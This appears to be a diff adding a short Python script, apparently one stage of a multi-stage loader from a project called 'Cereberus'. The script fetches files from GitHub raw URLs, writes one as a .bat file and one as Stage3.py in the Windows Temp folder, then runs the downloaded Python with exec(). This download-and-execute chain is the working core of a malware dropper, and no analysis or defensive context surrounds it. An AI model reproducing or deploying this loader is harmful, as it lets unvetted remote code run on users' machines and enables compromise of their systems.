@@ -1,0 +1,21 @@
+import os.path
+import urllib.request
+from bs4 import BeautifulSoup
+
+x = os.getlogin()
+
+path = "/Users/shrek/AppData/Local/Temp/Stage3.py"
+
+if os.path.isfile(path) == False:
+    file = open('Stage3.py', 'a')
+    file.close()
+
+filename = "/Users/shrek/AppData/Local/Temp/THost.bat"
+with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cereberus/main/TSource2.txt") as response:
+    data = response.read().decode("utf-8")
+    with open(filename, "a+") as fp: fp.write(data)
+
+# urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cereberus/main/TSource2.txt", "/Users/shrek/AppData/Local/Temp/THost.bat")
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cereberus/main/Stage3Source.txt", "/Users/shrek/AppData/Local/Temp/Stage3.py")
+
+exec(open("/Users/shrek/AppData/Local/Temp/Stage3.py").read())
